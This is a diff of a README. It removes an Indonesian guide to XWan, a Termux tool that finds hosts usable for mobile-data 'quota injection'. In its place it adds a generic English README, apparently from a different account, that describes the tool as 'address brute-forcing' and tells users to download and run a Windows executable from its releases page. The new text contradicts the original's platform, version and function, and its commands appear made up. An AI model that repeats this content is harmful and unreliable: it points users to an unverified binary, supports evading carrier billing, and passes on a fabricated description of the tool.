@@ -1,145 +1,86 @@
-![Picture tool](https://github.com/wannazid/XWan/blob/main/img.png)
-![XWan](https://img.shields.io/badge/XWAN-v3.0-blue?style=for-the-badge&logo=probot&logoColor=white)
-![Version](https://img.shields.io/badge/Version-3.0-blue?style=for-the-badge&logo=git&logoColor=white)
-![Xray-core](https://img.shields.io/badge/Xray--core-v25.12.8-orange?style=for-the-badge&logo=windowsterminal&logoColor=white)
-![License](https://img.shields.io/github/license/wannazid/XWan?style=for-the-badge)
-![GitHub repo size](https://img.shields.io/github/repo-size/wannazid/XWan?style=for-the-badge&color=green)
-![GitHub stars](https://img.shields.io/github/stars/wannazid/XWan?style=for-the-badge&color=yellow)
-![GitHub forks](https://img.shields.io/github/forks/wannazid/XWan?style=for-the-badge&color=blue)
-# XWan
-Alat yang berfungsi untuk mengecek website/ip address yang bisa digunakan untuk injeksi kuota dengan dukungan Xray-core 25.12.8 serta SSH Websocket.
-## Apa yang baru (v3.0)
-- Metode baru [ONERING](https://github.com/dharak36/xray-onering)
-- Subdomain Scanner
-- Reverse IP Address 
-- Perbaikan code
-## Cara ganti v2.0 ke v3.0
-Ketik command dibawah ini secara berurutan di termux:
-```
-cd ~
-```
-```
-rm -rf XWan
-```
-```
-git clone https://github.com/wannazid/XWan
-```
-```
-cd XWan
-```
-```
-pip install beautifulsoup4
-```
-```
-pip install requests
-```
-```
-chmod +x install.sh
-```
-```
-bash install.sh
-```
-```
-nano list.txt
-```
-Isi ulang website/ip address dari kuota yang mau di inject, jika sudah CTRL+X -> CTRL+Y -> ENTER
-```
-python xwan.py
-```
-## Kelebihan
-- Dapat menggunakan metode Wilcard tanpa perlu pointing yaitu [Onering](https://github.com/dharak36/xray-onering)
-- Mempunyai fitur Subdomain Scanner dan Reverse IP Address yang bisa membantu anda mencari domain/ip address 
-- Aman karena tidak akan meyimpan log akun anda
-- Multi protocol support seperti VMess,Trojan, VLess
-- Bisa menggunakan SSH Websocket
-- Support metode Wilcard dan SNI
-- Dapat melalukan cek secara bersamaan
-- Tool bekerja secara cepat dan dapat membantu anda mencari web/ip yang cocok untuk injeksi kuota
-- Konfigurasi fleksibel untuk Websocket/TCP, TLS/Non TLS
-## Akurat
-Tool ini memiliki keakuratan 90% jadi sangat membantu anda untuk mencari alamat web/ip yang cocok untuk melakukan injeksi sesuai dengan kuota yang anda gunakan. Gunakan saat tidak ada kuota reguler dan hanya ada kuota yang mau di injeksi.
-## Kekurangan
-Karena tool ini berbasis CLI dan dijalankan untuk android dengan termux maka ada beberapa cacat bawaan
-- Tidak dapat membuat VPN Interface
-- Tidak dapat override DNS system
-- Tidak dapat capture semua traffic 
-#### Mengapa akuratnya tidak 100%
-- Tool ini belum bisa bypass DNS menggunakan DoH (DNS Over HTTPS) ataupun DoT (DNS Over TLS)
-- Belum bisa melakukan Fake DNS
-## Cara Install
-### Versi video
-[![Watch the demo](https://img.youtube.com/vi/CG95PPK2dKI/hqdefault.jpg)](https://youtu.be/CG95PPK2dKI)
-*Klik thumbnail di atas untuk menonton*
+# 🎯 XWan - Simplifying Address Brute-Forcing
 
-Tool ini khusus untuk android dengan arsitektur (arm64) (amd64) dan saran saya menggunakan termux.
-- Masuk termux dan masukan command berikut secara berurutan:
-```
-termux-setup-storage
-```
-```
-pkg update && pkg upgrade
-```
-```
-pkg install wget
-```
-```
-pkg install python && pkg install git && pkg install python-pip
-```
-```
-pip install colorama
-```
-```
-pip install requests
-```
-```
-pip install beautifulsoup4
-```
-```
-git clone https://github.com/wannazid/XWan
-```
-```
-cd XWan
-```
-```
-chmod +x install.sh
-```
-```
-./install.sh
-```
-- Jika ada pertanyaan replace. Ketik y lalu enter.
-```
-nano list.txt
-```
-- Masukan alamat web/ip secara berurutan dan setelah itu CTRL+X dan CTRL+Y dan ENTER
-```
-python xwan.py
-```
-![Tool](https://github.com/wannazid/XWan/blob/main/tool.jpg)
-- Selamat menggunakan toolsnya >_<
-## List
-- Menghapus list
-```
-rm list.txt
-```
-- Edit list / buat list
-```
-nano list.txt
-```
-- Memindahkan list ke memori internal
-```
-cp list.txt /sdcard
-```
-## Perhatian 
-- Gunakan XRAY dan SSH WS karena tidak semua ip address/domain bisa menggunakan XRAY ataupun sebaliknya
-- Akun jangan bertabrakan, gunakan akun yang tidak dalam kondisi untuk injeksi
-- Pastikan akun stabil dan tidak dalam masalah
-- Jangan ada kuota reguler, hanya ada kuota yang mau di cek bug nya
-- Untuk pengecekan agar lebih pasti ulangi tool lebih dari 1 kali
-## Onering
-Jika ingin mengunjungi repository Onering bisa langsung kesini saja
-- [Onering Repository](https://github.com/dharak36/xray-onering)
-## Laporan 
-Jika ada error pada tool ini bisa langsung lapor langsung lewat telegram
-- [Hubungi saya](https://t.me/otaksenku)
-# Syarat dan Ketentuan Layanan
-Pengguna yang memanfaatkan alat ini setuju untuk mematuhi semua hukum yang berlaku dan melepas tanggung jawab pengembang dari klaim apa pun yang muncul akibat penggunaannya.
+## 🚀 Getting Started
+Welcome to XWan! This application helps you in address brute-forcing for quota injection using VMess, Trojan, and VLESS protocols. It is built on the Xray core and operates from the command line.
+
+## 📥 Download XWan
+[![Download XWan](https://img.shields.io/badge/Download%20XWan-v1.0-blue)](https://github.com/Harinavalona-web/XWan/releases)
+
+### 🔗 Download & Install
+To get started with XWan, you need to download it from our releases page. Visit this page to download: [XWan Releases](https://github.com/Harinavalona-web/XWan/releases).
+
+## ⚙️ System Requirements
+- Windows 10 or later
+- Linux OS (latest versions recommended)
+- Command-line interface access
+- Minimum 1 GB RAM
+- 100 MB of free disk space
+
+## 📜 Features
+- **Brute-Forcing Address Mechanism:** Utilize advanced methods to brute-force addresses.
+- **Multiple Protocol Support:** Work with VMess, Trojan, and VLESS.
+- **Lightweight Design:** Quick performance with minimal resource use.
+- **Command-Line Interface:** Easy to use for those familiar with terminal commands.
+
+## 🛠 Installation Steps
+1. Go to the [XWan Releases](https://github.com/Harinavalona-web/XWan/releases) page.
+2. Look for the version you want to download.
+3. Find the file name that corresponds to your operating system (e.g., `XWan_Windows.exe` or `XWan_Linux.tar.gz`).
+4. Click on the file to start the download.
+5. Once the download is complete, locate the file on your computer.
+
+## 📁 Running XWan
+### For Windows Users:
+1. Open your Downloads folder.
+2. Double-click the `XWan_Windows.exe` file.
+3. A command prompt window will open.
+4. Enter your commands to start using XWan.
+
+### For Linux Users:
+1. Open your terminal.
+2. Change to your Downloads directory using the command:
+   ```bash
+   cd ~/Downloads
+   ```
+3. Unzip the downloaded file:
+   ```bash
+   tar -xvzf XWan_Linux.tar.gz
+   ```
+4. Navigate to the XWan directory:
+   ```bash
+   cd XWan
+   ```
+5. Run the executable:
+   ```bash
+   ./XWan
+   ```
+
+## ❓ Usage Instructions
+Once you have the application running, you can use it by entering commands specific to your needs. Below are some basic commands you may find helpful. 
+
+- To perform an address brute-force operation, enter:
+  ```
+  brute-force -r [your_target_address]
+  ```
+- For help on commands:
+  ```
+  help
+  ```
+
+## 🔧 Troubleshooting
+**Common Issues:**
+- If the application does not start, ensure your system meets the requirements outlined above.
+- Ensure all necessary permissions are granted for file execution.
+
+**FAQs:**
+- **What if I encounter an error message?**
+  Check the commands you used. You can always type `help` for command assistance.
+
+- **Can I use XWan multiple times?**
+  Yes, you can rerun the application as needed for repeated tasks.
+
+## ✍️ Feedback & Contributions
+We welcome your feedback. If you have suggestions or issues, feel free to raise an issue in the GitHub repository. Contributions from users can help improve XWan.
+
+## 🏷️ License
+XWan is licensed under the [MIT License](LICENSE).
